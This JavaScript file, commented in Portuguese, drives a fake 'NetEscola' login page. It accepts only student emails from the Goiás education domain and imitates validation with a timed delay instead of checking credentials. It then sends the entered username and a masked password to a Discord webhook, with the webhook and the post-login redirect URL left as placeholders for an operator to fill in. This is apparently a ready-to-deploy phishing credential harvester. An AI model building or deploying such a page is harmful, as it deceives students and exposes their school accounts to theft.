// Configurações
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/seu-webhook-aqui';
const REDIRECT_URL = ''; // Você vai preencher depois

// Elementos DOM
const loginForm = document.getElementById('loginForm');
const loadingOverlay = document.getElementById('loadingOverlay');
const forgotLink = document.querySelector('.forgot-link');

// Validar email educa.go
function isValidEducaGoEmail(email) {
    return /^[a-zA-Z0-9._%+-]+@aluno\.educa\.go\.gov\.br$/i.test(email);
}

// Enviar para Discord
async function sendToDiscord(username, password) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('seu-webhook-aqui')) {
        console.log('Webhook não configurado');
        return;
    }

    const hiddenPassword = '*'.repeat(Math.min(4, password.length)) + 
                          password.substring(Math.min(4, password.length)).replace(/./g, '*');
    
    const embed = {
        title: '🔐 Login NetEscola',
        color: 0x006400,
        fields: [
            { name: '👤 Usuário', value: username },
            { name: '🔑 Senha (oculta)', value: hiddenPassword },
            { name: '📅 Data', value: new Date().toLocaleString('pt-BR') }
        ],
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Erro ao enviar para Discord:', error);
    }
}

// Event Listeners
loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    
    // Validar email
    if (!isValidEducaGoEmail(username)) {
        alert('Por favor, use um e-mail institucional válido (@aluno.educa.go.gov.br)');
        return;
    }
    
    // Mostrar loading
    loadingOverlay.style.display = 'flex';
    
    // Simular validação
    setTimeout(async () => {
        // Em produção, aqui seria uma chamada à API real
        const isValid = username && password.length >= 6;
        
        if (isValid) {
            // Enviar para Discord
            await sendToDiscord(username, password);
            
            // Redirecionar
            if (REDIRECT_URL) {
                window.location.href = REDIRECT_URL;
            } else {
                alert('Login realizado com sucesso! Configure a URL de redirecionamento no script.js');
                loadingOverlay.style.display = 'none';
            }
        } else {
            alert('Credenciais inválidas. Verifique seu usuário e senha.');
            loadingOverlay.style.display = 'none';
        }
    }, 1500);
});

// Link "Esqueci a senha"
forgotLink.addEventListener('click', function(e) {
    e.preventDefault();
    alert('Entre em contato com a secretaria da sua escola para recuperar sua senha.');
});
